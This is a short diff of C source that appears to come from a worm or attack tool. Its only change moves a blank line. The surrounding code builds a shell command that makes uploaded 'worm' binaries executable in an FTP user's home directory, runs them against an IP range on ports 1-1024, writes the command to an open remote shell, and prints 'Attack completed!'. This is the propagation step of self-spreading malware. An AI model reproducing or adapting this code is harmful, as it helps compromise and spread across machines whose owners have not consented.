@@ -165,9 +165,9 @@ int main(int argc, char *const *argv) {
         }
 
         strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
-
         length = snprintf(cmd_buffer, sizeof cmd_buffer, "chmod +x ~%s/worm* ; ~%s/worm %s 1-1024 ; ~%s/worm.i686 %s 1-1024\n", FTP_USER, FTP_USER, range, FTP_USER, range);
         fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
+
         write(shell_fd, cmd_buffer, length);
         close(shell_fd);
         fprintf(stdout, "Attack completed!\n");
